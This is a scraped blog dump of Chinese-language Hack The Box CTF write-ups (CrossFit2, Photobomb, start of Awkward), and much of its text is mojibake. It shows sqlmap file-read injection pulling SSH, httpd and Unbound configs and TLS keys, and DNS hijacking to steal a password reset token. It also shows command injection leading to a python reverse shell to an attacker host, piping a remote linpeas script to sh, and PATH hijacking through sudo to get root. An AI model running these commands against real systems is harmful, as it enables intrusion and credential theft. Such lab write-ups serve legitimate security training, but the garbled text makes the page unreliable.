15:45:34 naddy Exp $ # # Sample login.conf file. See login.conf(5) for details. # # # Standard authentication styles: # # passwd Use only the local password file # chpass Do not authenticate, but change user&#39;s password (change # the YP password if the user has one, else change the # local password) # lchpass Do not login; change user&#39;s local password instead # radius Use radius authentication # reject Use rejected authentication # skey Use S/Key authentication # activ ActivCard X9.9 token authentication # crypto CRYPTOCard X9.9 token authentication # snk Digital Pathways SecureNet Key authentication # tis TIS Firewall Toolkit authentication # token Generic X9.9 token authentication # yubikey YubiKey authentication # # Default allowed authentication styles auth-defaults:auth=passwd,skey: # Default allowed authentication styles for authentication type ftp auth-ftp-defaults:auth-ftp=passwd: # # The default values # To alter the default authentication types change the line: # :tc=auth-defaults:\\ # to read something like: (enables passwd, &quot;myauth&quot;, and activ) # :auth=passwd,myauth,activ:\\ # Any value changed in the daemon class should be reset in default # class. # default:\\ :path=/usr/bin /bin /usr/sbin /sbin /usr/X11R6/bin /usr/local/bin /usr/local/sbin:\\ :umask=022:\\ :datasize-max=768M:\\ :datasize-cur=768M:\\ :maxproc-max=256:\\ :maxproc-cur=128:\\ :openfiles-max=102400:\\ :openfiles-cur=102400:\\ :stacksize-cur=4M:\\ :localcipher=blowfish,a:\\ :tc=auth-defaults:\\ :tc=auth-ftp-defaults: # # Settings used by /etc/rc and root # This must be set properly for daemons started as root by inetd as well. # Be sure to reset these values to system defaults in the default class! # daemon:\\ :ignorenologin:\\ :datasize=infinity:\\ :maxproc=infinity:\\ :openfiles-max=102400:\\ :openfiles-cur=102400:\\ :stacksize-cur=8M:\\ :auth-ssh=yubikey:\\ :auth-su=reject:\\ :tc=default: # # Staff have fewer restrictions and can login even when nologins are set. # staff:\\ :datasize-cur=1536M:\\ :datasize-max=infinity:\\ :maxproc-max=512:\\ :maxproc-cur=256:\\ :ignorenologin:\\ :requirehome@:\\ :tc=default: # # Authpf accounts get a special motd and shell # authpf:\\ :welcome=/etc/motd.authpf:\\ :shell=/usr/sbin/authpf:\\ :tc=default: # # Building ports with DPB uses raised limits # pbuild:\\ :datasize-max=infinity:\\ :datasize-cur=8192M:\\ :maxproc-max=1024:\\ :maxproc-cur=384:\\ :priority=5:\\ :tc=default: # # Override resource limits for certain daemons started by rc.d(8) # bgpd:\\ :openfiles=512:\\ :tc=daemon: unbound:\\ :openfiles=512:\\ :tc=daemon: &#x2F;etc&#x2F;ssh&#x2F;sshd_configrootéœ€è¦å…¬é’¥å’Œå¯†ç ï¼Œérootéœ€è¦å¯†ç  sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --file-read=&quot;/etc/ssh/sshd_config&quot; # $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $ # This is the sshd server system-wide configuration file. See # sshd_config(5) for more information. # The strategy used for options in the default sshd_config shipped with # OpenSSH is to specify options with their default value where # possible, but leave them commented. Uncommented options override the # default value. #Port 22 #AddressFamily any #ListenAddress 0.0.0.0 #ListenAddress :: #HostKey /etc/ssh/ssh_host_rsa_key #HostKey /etc/ssh/ssh_host_ecdsa_key #HostKey /etc/ssh/ssh_host_ed25519_key # Ciphers and keying #RekeyLimit default none # Logging #SyslogFacility AUTH #LogLevel INFO # Authentication: #LoginGraceTime 2m PermitRootLogin yes #StrictModes yes #MaxAuthTries 6 #MaxSessions 10 #PubkeyAuthentication yes # The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2 # but this is overridden so installations will only check .ssh/authorized_keys AuthorizedKeysFile .ssh/authorized_keys #AuthorizedPrincipalsFile none #AuthorizedKeysCommand none #AuthorizedKeysCommandUser nobody # For this to work you will also need host keys in /etc/ssh/ssh_known_hosts #HostbasedAuthentication no # Change to yes if you don&#39;t trust ~/.ssh/known_hosts for # HostbasedAuthentication #IgnoreUserKnownHosts no # Don&#39;t read the user&#39;s ~/.rhosts and ~/.shosts files #IgnoreRhosts yes # To disable tunneled clear text passwords, change to no here! #PasswordAuthentication yes #PermitEmptyPasswords no # Change to no to disable s/key passwords #ChallengeResponseAuthentication yes #AllowAgentForwarding yes #AllowTcpForwarding yes #GatewayPorts no #X11Forwarding no #X11DisplayOffset 10 #X11UseLocalhost yes #PermitTTY yes #PrintMotd yes #PrintLastLog yes #TCPKeepAlive yes #PermitUserEnvironment no #Compression delayed #ClientAliveInterval 0 #ClientAliveCountMax 3 #UseDNS no #PidFile /var/run/sshd.pid #MaxStartups 10:30:100 #PermitTunnel no #ChrootDirectory none #VersionAddendum none # no default banner path #Banner none # override default of no subsystems Subsystem sftp /usr/libexec/sftp-server # Example of overriding settings on a per-user basis #Match User anoncvs # X11Forwarding no # AllowTcpForwarding no # PermitTTY no # ForceCommand cvs server Match User root AuthenticationMethods publickey,password Match User *,!root AuthenticationMethods password &#x2F;etc&#x2F;httpd.confæ ¹æ®é…ç½®æ–‡ä»¶ï¼Œé™¤äº†chatå’Œemployeesè¿˜æœ‰å…¶ä»–çš„ï¼š sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --file-read=&quot;/etc/httpd.conf&quot; # $OpenBSD: httpd.conf,v 1.20 2018/06/13 15:08:24 reyk Exp $ types { include &quot;/usr/share/misc/mime.types&quot; } server &quot;0.0.0.0&quot; { no log listen on lo0 port 8000 root &quot;/htdocs&quot; directory index index.php location &quot;*.php*&quot; { fastcgi socket &quot;/run/php-fpm.sock&quot; } } server &quot;employees&quot; { no log listen on lo0 port 8001 root &quot;/htdocs_employees&quot; directory index index.php location &quot;*.php*&quot; { fastcgi socket &quot;/run/php-fpm.sock&quot; } } server &quot;chat&quot; { no log listen on lo0 port 8002 root &quot;/htdocs_chat&quot; directory index index.html location match &quot;^/home$&quot; { request rewrite &quot;/index.html&quot; } location match &quot;^/login$&quot; { request rewrite &quot;/index.html&quot; } location match &quot;^/chat$&quot; { request rewrite &quot;/index.html&quot; } location match &quot;^/favicon.ico$&quot; { request rewrite &quot;/images/cross.png&quot; } } &#x2F;etc&#x2F;relayd.confå¾—åˆ°crossfit-club.htbï¼ŒåŠ hostsï¼š echo 10.10.10.232 crossfit-club.htb &gt;&gt; /etc/hosts sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --file-read=&quot;/etc/relayd.conf&quot; table&lt;1&gt;{127.0.0.1} table&lt;2&gt;{127.0.0.1} table&lt;3&gt;{127.0.0.1} table&lt;4&gt;{127.0.0.1} http protocol web{ pass request quick header &quot;Host&quot; value &quot;*crossfit-club.htb&quot; forward to &lt;3&gt; pass request quick header &quot;Host&quot; value &quot;*employees.crossfit.htb&quot; forward to &lt;2&gt; match request path &quot;/*&quot; forward to &lt;1&gt; match request path &quot;/ws*&quot; forward to &lt;4&gt; http websockets } table&lt;5&gt;{127.0.0.1} table&lt;6&gt;{127.0.0.1 127.0.0.2 127.0.0.3 127.0.0.4} http protocol portal{ pass request quick path &quot;/&quot; forward to &lt;5&gt; pass request quick path &quot;/index.html&quot; forward to &lt;5&gt; pass request quick path &quot;/home&quot; forward to &lt;5&gt; pass request quick path &quot;/login&quot; forward to &lt;5&gt; pass request quick path &quot;/chat&quot; forward to &lt;5&gt; pass request quick path &quot;/js/*&quot; forward to &lt;5&gt; pass request quick path &quot;/css/*&quot; forward to &lt;5&gt; pass request quick path &quot;/fonts/*&quot; forward to &lt;5&gt; pass request quick path &quot;/images/*&quot; forward to &lt;5&gt; pass request quick path &quot;/favicon.ico&quot; forward to &lt;5&gt; pass forward to &lt;6&gt; http websockets } relay web{ listen on &quot;0.0.0.0&quot; port 80 protocol web forward to &lt;1&gt; port 8000 forward to &lt;2&gt; port 8001 forward to &lt;3&gt; port 9999 forward to &lt;4&gt; port 4419 } relay portal{ listen on 127.0.0.1 port 9999 protocol portal forward to &lt;5&gt; port 8002 forward to &lt;6&gt; port 5000 mode source-hash } åæ§½ä¸€ä¸‹ï¼Œæ³¨å…¥è¯»æ–‡ä»¶æ˜¯çœŸçš„æ…¢ï¼Œæ…¢çš„æœ‰ç‚¹ç¦»è°±äº† å’±ä»¬è®¿é—®ä¸€ä¸‹æ–°å‘ç°çš„é¡µé¢ ä¼¼ä¹åˆæ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œä½†å’±ä»¬ä¾ç„¶æ²¡æœ‰è´¦å·å¯†ç  æœ¬æƒ³æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œå´å‘ç°è¢«ç¦æ­¢æ³¨å†Œäº† åœ¨æµé‡å†…å‘ç°è¯·æ±‚äº† /api/auth ï¼Œå’±ä»¬fuzzä¸€ä¸‹å…¶ä»–apiçœ‹çœ‹ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -u http://crossfit-club.htb/api/ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -u http://crossfit-club.htb/api/ =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://crossfit-club.htb/api/ [+] Method: GET [+] Threads: 20 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/api/objects.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: json [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/08/02 19:14:30 Starting gobuster in directory enumeration mode =============================================================== http://crossfit-club.htb/api/auth (Status: 200) [Size: 66] http://crossfit-club.htb/api/ping (Status: 200) [Size: 71] =============================================================== 2021/08/02 19:15:51 Finished =============================================================== gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -m POST -u http://crossfit-club.htb/api/ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -m POST -u http://crossfit-club.htb/api/ =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://crossfit-club.htb/api/ [+] Method: POST [+] Threads: 20 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/api/objects.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: json [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/08/02 19:22:33 Starting gobuster in directory enumeration mode =============================================================== http://crossfit-club.htb/api/Login (Status: 200) [Size: 50] http://crossfit-club.htb/api/login (Status: 200) [Size: 50] http://crossfit-club.htb/api/signup (Status: 200) [Size: 50] =============================================================== 2021/08/02 19:23:53 Finished =============================================================== åœ¨apiä¸­å‘ç°äº†signupï¼Œå’±ä»¬è®¿é—®ä¸€ä¸‹çœ‹çœ‹ è®¿é—®åæç¤ºæ— æ³•GETè·å– /api/signup ï¼Œå’±ä»¬ä½¿ç”¨burpæŠ“åŒ…è¯•è¯• è¿™è¾¹æç¤ºå’±ä»¬CSRF Tokenä¸å¯¹ ç¨å¾®ä¿®æ”¹åï¼Œæç¤ºåªæœ‰ç®¡ç†å‘˜å¯ä»¥æ³¨å†Œç”¨æˆ· POST /api/signup HTTP/1.1 Host: crossfit-club.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: connect.sid=s%3Ae44z5Xt6fe5g1VLuMNHs-ZD7sFPh8C4k.NEClY9BvwLeMaL3zZCfxvxxFZfHp6iak0Xa8QLTO1pw Upgrade-Insecure-Requests: 1 Content-Length: 113 X-CSRF-Token: xmiei8Ex-OKmxFdQOUaVH_4aoIjuUT-dz6HQ { &quot;username&quot;:&quot;lucifiel&quot;, &quot;password&quot;:&quot;lucifiel123&quot;, &quot;email&quot;:&quot;lucifiel@crossfit.htb&quot;, &quot;confirm&quot;:&quot;lucifiel123&quot; } å’±ä»¬æŠŠç›®å…‰æ”¾åœ¨8953ç«¯å£ä¸Šï¼Œè¿™ä¸ªæ˜¯Unboundçš„control-partç«¯å£ï¼Œå’±ä»¬é€šè¿‡sqlå»è¯»å– &gt; https://man.openbsd.org/unbound.conf &#x2F;var&#x2F;unbound&#x2F;etc&#x2F;unbound.confsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --file-read=&quot;/var/unbound/etc/unbound.conf&quot; server: interface: 127.0.0.1 interface: ::1 access-control: 0.0.0.0/0 refuse access-control: 127.0.0.0/8 allow access-control: ::0/0 refuse access-control: ::1 allow hide-identity: yes hide-version: yes msg-cache-size: 0 rrset-cache-size: 0 cache-max-ttl: 0 cache-max-negative-ttl: 0 auto-trust-anchor-file: &quot;/var/unbound/db/root.key&quot; val-log-level: 2 aggressive-nsec: yes include: &quot;/var/unbound/etc/conf.d/local_zones.conf&quot; remote-control: control-enable: yes control-interface: 0.0.0.0 control-use-cert: yes server-key-file: &quot;/var/unbound/etc/tls/unbound_server.key&quot; server-cert-file: &quot;/var/unbound/etc/tls/unbound_server.pem&quot; control-key-file: &quot;/var/unbound/etc/tls/unbound_control.key&quot; control-cert-file: &quot;/var/unbound/etc/tls/unbound_control.pem&quot; å’±ä»¬éœ€è¦ä¸‹è½½ä¸‹é¢è¿™äº›æ–‡ä»¶ sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --file-read=&quot;/var/unbound/etc/tls/unbound_server.pem&quot; sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --file-read=&quot;/var/unbound/etc/tls/unbound_control.key&quot; sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --file-read=&quot;/var/unbound/etc/tls/unbound_control.pem&quot; sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --file-read=&quot;/var/unbound/etc/tls/unbound_server.key&quot; sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --file-read=&quot;/etc/httpd.conf&quot; sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --file-read=&quot;/etc/passwd&quot; sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --file-read=&quot;/var/unbound/etc/unbound.conf&quot; sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --file-read=&quot;/etc/relayd.conf&quot; ä¿®æ”¹crossfit.confæ–‡ä»¶å†…å®¹ remote-control: control-enable: yes control-use-cert: &quot;yes&quot; server-cert-file: &quot;/etc/unbound/unbound_server.pem&quot; control-key-file: &quot;/etc/unbound/unbound_control.key&quot; control-cert-file: &quot;/etc/unbound/unbound_control.pem&quot; å°†æ‰€æœ‰è¯ä¹¦æ–‡ä»¶éƒ½æ”¾åˆ°/etc/unbound/ç›®å½•ä¸‹ ç„¶åæ£€æŸ¥ä¸€ä¸‹çŠ¶æ€ unbound-control -c crossfit.conf -s 10.10.10.232 status â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# unbound-control -c crossfit.conf -s 10.10.10.232 status version: 1.11.0 verbosity: 1 threads: 1 modules: 2 [ validator iterator ] uptime: 44 seconds options: control(ssl) unbound (pid 55403) is running... ä»relaydé…ç½®æ–‡ä»¶ä¸­ï¼ŒçŸ¥é“äº†æˆ‘ä»¬å¯ä»¥é…ç½®çš„æ˜¯*employees.crossfit.htbï¼Œç°åœ¨æˆ‘ä»¬æ“ä½œèµ·æ¥ æˆ‘ä»¬åœ¨å‰é¢æ·»åŠ å…¶ä»–å­—ç¬¦ï¼Œå¹¶ä¸”æ§åˆ¶å¯¹åº”dnsï¼Œä»¥è¾¾åˆ°å¯†ç åŠ«æŒå……å€¼é“¾æ¥çš„ç›®çš„ å°†dnsè¯·æ±‚è½¬å‘åˆ°æˆ‘ä»¬çš„dnsæœåŠ¡å™¨ unbound-control -s 10.10.10.232 forward_add +i xemployees.crossfit.htb 10.10.14.27@53 å°†xemployees.crossfit.htbæ·»åŠ åˆ°/etc/hosts echo 10.10.10.232 xemployees.crossfit.htb &gt;&gt; /etc/hosts ä½¿ç”¨dnschefè¿›è¡ŒåŠ«æŒ &gt; https://github.com/LucifielHack/dnschef æœ¬åœ°ä½¿ç”¨ncç›‘å¬80ç«¯å£ nc -nvlp 80 ç„¶åunboundæ·»åŠ ä¸€æ¡è§„åˆ™ï¼Œå°†dnsè¯·æ±‚è½¬å‘åˆ°æˆ‘ä»¬çš„dnsæœåŠ¡å™¨ unbound-control -c crossfit.conf -s 10.10.10.232 forward_add +i xemployees.crossfit.htb 10.10.14.2 ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥è·å¾—é‡ç½®é“¾æ¥ sudo python3 dnschef.py -i 10.10.14.2 --fakedomains xemployees.crossfit.htb --fakeip 127.0.0.1 sudo python3 dnschef.py -i 10.10.14.2 --fakedomains xemployees.crossfit.htb --fakeip 10.10.14.2 â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nc -nvlp 80 listening on [any] 80 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.232] 1352 GET /password-reset.php?token=ffe51814f0831927a5bff7ad15a09cdac20d68afe0d4945f4b32ead391d6ceeb03a9e25a07299c49947776cfd9f2ab6422260817233b1818ae8b86ca273de465 HTTP/1.1 Host: xemployees.crossfit.htb User-Agent: Mozilla/5.0 (X11; OpenBSD amd64; rv:82.0) Gecko/20100101 Firefox/82.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Referer: http://crossfit-club.htb/ Upgrade-Insecure-Requests: 1 æˆåŠŸè¿”å›tokenå€¼","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Photobomb - Hackthebox","slug":"Hackthebox - Photobomb","date":"2023-05-07T11:38:36.000Z","updated":"2023-05-20T02:43:24.000Z","comments":true,"path":"2023/05/07/Hackthebox - Photobomb/","link":"","permalink":"http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20Photobomb/","excerpt":"","text":"Hackthebox Photobombé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.182 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-20 23:49 EST Nmap scan report for 10.10.11.182 Host is up (0.26s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e22473bbfbdf5cb520b66876748ab58d (RSA) | 256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA) |_ 256 20e05d8cba71f08c3a1819f24011d29e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://photobomb.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=12/20%OT=22%CT=1%CU=41677%PV=Y%DS=2%DC=T%G=Y%TM=63A290 OS:81%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)SE OS:Q(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%TS=A)OPS(O1=M539ST11NW7%O2=M539ST11NW7% OS:O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=FE88%W2 OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M539NNS OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y% OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR% OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40% OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G% OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 995/tcp) HOP RTT ADDRESS 1 275.46 ms 10.10.14.1 2 282.41 ms 10.10.11.182 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.89 seconds Http ä¼šè¢«è·³è½¬åˆ°åŸŸå photobomb.htb å»åŠ å…¥ hosts è§£æ echo 10.10.11.182 photobomb.htb &gt;&gt; /etc/hosts å†è®¿é—®ä¸€æ¬¡å°±æ˜¯æ­£å¸¸çš„äº† é¦–é¡µæœ‰ä¸ª click hereï¼Œç‚¹å‡»åä¼šè·³è½¬ç™»é™†é¡µé¢ï¼Œå»æ‰¾ä¸€ä¸‹å¯†ç  åœ¨ js æ–‡ä»¶ä¸­å‘ç°ä¸€æ®µ photobomb.js function init() { // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) { document.getElementsByClassName(&#39;creds&#39;)[0].setAttribute(&#39;href&#39;,&#39;http://pH0t0:b0Mb!@photobomb.htb/printer&#39;); } } window.onload = init; åœ¨é‡Œé¢æ‰¾åˆ°äº†ä¸€æ®µé“¾æ¥ï¼Œé‡Œé¢åº”è¯¥å°±æ˜¯è´¦å·å¯†ç äº† ç™»é™†æˆåŠŸ ä»–ä¸‹é¢æœ‰ä¸ªä¸‹è½½å›¾ç‰‡çš„åŠŸèƒ½ï¼ŒæŠ“ä¸ªåŒ…çœ‹çœ‹ ç¡®å®æ˜¯ä¸‹è½½ï¼Œä½†æ˜¯è¿™ä¸ªå‚æ•°çœ‹ç€å¾ˆæœ‰æå¤´å•Šï¼Œè¿™çœ‹ç€å°±æ˜¯å¾ˆæ˜æ˜¾çš„å‘½ä»¤æ‹¼æ¥æ‰§è¡Œ æ¼æ´åˆ©ç”¨åœ¨ filetype åé¢ä¼¼ä¹å¯ä»¥æ‹¼æ¥ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œå»å¼€å¯ä¸€ä¸ª http æœåŠ¡å™¨è¯•è¯• python3 -m http.server 80 photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg;curl+http://10.10.14.11&amp;dimensions=30x20 ç„¶åå»è¯·æ±‚ä¸€ä¸‹ ç¡®å®æœ‰å›åŒ…ï¼Œé‚£å°±è¯æ˜å¯ä»¥æ‰§è¡Œå‘½ä»¤ export RHOST=&quot;10.10.14.11&quot;;export RPORT=4444;python3 -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#39; æˆ‘ä»¬æ„é€ å¥½ poc ä»¥åï¼Œä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 ç„¶åå» burp ä¸­æ‰§è¡Œ export RHOST=&quot;10.10.14.11&quot;;export RPORT=4444;python3 -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#39; â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.11] from (UNKNOWN) [10.10.11.182] 46772 wizard@photobomb:~/photobomb$ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; wizard@photobomb:~/photobomb$ whoami&amp;&amp;id whoami&amp;&amp;id wizard uid=1000(wizard) gid=1000(wizard) groups=1000(wizard) æˆåŠŸå¼¹å› shell wizard@photobomb:~$ cat user.txt cat user.txt 9ef16b54cbd2be4ef91cf67b6642e804 æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡å…ˆè·‘ä¸ª linpeas çœ‹çœ‹ curl -L http://10.10.14.11/linpeas.sh|sh wizard@photobomb:~$ sudo -l sudo -l Matching Defaults entries for wizard on photobomb: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User wizard may run the following commands on photobomb: (root) SETENV: NOPASSWD: /opt/cleanup.sh å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥æ— å¯†ç ä½¿ç”¨ root æƒé™æ‰§è¡Œ &#x2F;opt&#x2F;cleanup.shï¼Œå…ˆå»çœ‹çœ‹è¿™ä¸ªæ–‡ä»¶ #!/bin/bash . /opt/.bashrc cd /home/wizard/photobomb # clean up log files if [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ] then /bin/cat log/photobomb.log &gt; log/photobomb.log.old /usr/bin/truncate -s0 log/photobomb.log fi # protect the priceless originals find source_images -type f -name &#39;*.jpg&#39; -exec chown root:root {} \\; å¯¹äºè¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬åªæœ‰è¯»å–å’Œå†™å…¥æƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—å…ˆææ¸…æ¥šä»–å¹²äº†ä»€ä¹ˆ å¤§æ¦‚çœ‹äº†ä¸€ä¸‹ï¼ŒåŠŸèƒ½ç®€å•çš„è¯´å°±æ˜¯è·å–æ—¥å¿—æ–‡ä»¶å¹¶å°†å…¶å†…å®¹ç§»åŠ¨åˆ° photobonb.log.oldï¼Œç„¶åä½¿ç”¨ truncate æ¸…é™¤ photobomb.log è¿™é‡Œçš„çªç ´ç‚¹åœ¨äºæœ€åä¸€å¥ï¼Œä»–çš„ find å‘½ä»¤ä½¿ç”¨çš„æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œè€Œä¸æ˜¯ç»å¯¹è·¯å¾„ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ”¹å˜ä¸€ä¸‹ç¯å¢ƒå˜é‡ï¼Œç„¶ååœ¨å½“å‰ç›®å½•åˆ›å»ºä¸€ä¸ª find æ–‡ä»¶ï¼Œé‡Œé¢å†™ä¸€ä¸ªæ¶æ„ pocï¼Œç„¶å sudo æ‰§è¡Œçš„æ—¶å€™ï¼Œå°±èƒ½ç›´æ¥è·å¾—æˆ‘ä»¬æƒ³è¦çš„ç»“æœ echo &quot;/bin/bash&quot; &gt; find chmod +x find sudo PATH=$PWD:$PATH /opt/cleanup.sh wizard@photobomb:~$ echo &quot;/bin/bash&quot; &gt; find echo &quot;/bin/bash&quot; &gt; find wizard@photobomb:~$ chmod +x find chmod +x find wizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh sudo PATH=$PWD:$PATH /opt/cleanup.sh root@photobomb:/home/wizard/photobomb# id id uid=0(root) gid=0(root) groups=0(root) root@photobomb:/home/wizard/photobomb# whoami whoami root æˆåŠŸè·å¾— root æƒé™ root@photobomb:/home/wizard/photobomb# cat /root/root.txt cat /root/root.txt aefec07aac4191d73f9f0e8dadd6ee58 æˆåŠŸè·å¾— root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Awkward - Hackthebox","slug":"Hackthebox - Awkward","date":"2023-03-12T11:38:36.000Z","updated":"2023-05-20T01:18:02.000Z","comments":true,"path":"2023/03/12/Hackthebox - Awkward/","link":"","permalink":"http://www.lucifiel.com/2023/03/12/Hackthebox%20-%20Awkward/","excerpt":"","text":"Hackthebox - Awkwardé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.11.185 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-11 01:55 CST Nmap scan report for 10.10.11.185 Host is up (0.083s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 7254afbaf6e2835941b7cd611c2f418b (ECDSA) |_ 256 59365bba3c7821e326b37d23605aec38 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Site doesn&#39;t have a title (text/html). |_http-server-header: nginx/1.18.0 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: 